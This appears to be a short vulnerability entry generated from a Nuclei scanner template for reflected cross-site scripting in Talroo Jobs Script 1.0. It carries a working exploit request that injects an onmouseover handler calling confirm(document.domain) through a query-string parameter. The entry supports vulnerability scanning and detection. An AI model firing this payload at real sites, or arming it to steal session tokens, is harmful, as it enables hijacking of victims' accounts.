# Vulnerability: Talroo Jobs Script 1.0 - Cross-Site Scripting
**Classification:** PACKETSTORM
**Source:** Nuclei Template (`talroo-jobs-xss.yaml`)

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?page=jobs&category=1&lrw3e%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22k1n44=1
```

